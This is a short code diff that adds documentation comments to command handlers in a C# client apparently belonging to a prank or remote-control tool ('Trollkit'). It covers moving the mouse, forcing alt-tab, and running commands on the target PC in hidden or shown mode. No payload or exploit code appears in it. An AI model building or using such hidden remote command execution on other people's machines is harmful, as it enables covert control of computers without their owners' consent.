@@ -36,6 +36,11 @@ namespace Trollkit_Client.Modules.CommandHandlers
 			return false;
 		}
 
+		/// <summary>
+		/// Changes the position of the mouse on the client
+		/// </summary>
+		/// <param name="coordinates">"x,y"</param>
+		/// <returns></returns>
 		private bool MousePosition(string coordinates)
 		{
 			try
@@ -51,6 +56,11 @@ namespace Trollkit_Client.Modules.CommandHandlers
 			}
 		}
 
+		/// <summary>
+		/// Function that executes the provided command on the client, hidden or shown
+		/// </summary>
+		/// <param name="command">{hidden;show},command</param>
+		/// <returns></returns>
 		private bool RunCommand(string command)
 		{
 			try
@@ -84,6 +94,10 @@ namespace Trollkit_Client.Modules.CommandHandlers
 			}
 		}
 
+		/// <summary>
+		/// Function that executes a random alt-tab on the pc
+		/// </summary>
+		/// <returns></returns>
 		private bool AltTab()
 		{
 			try
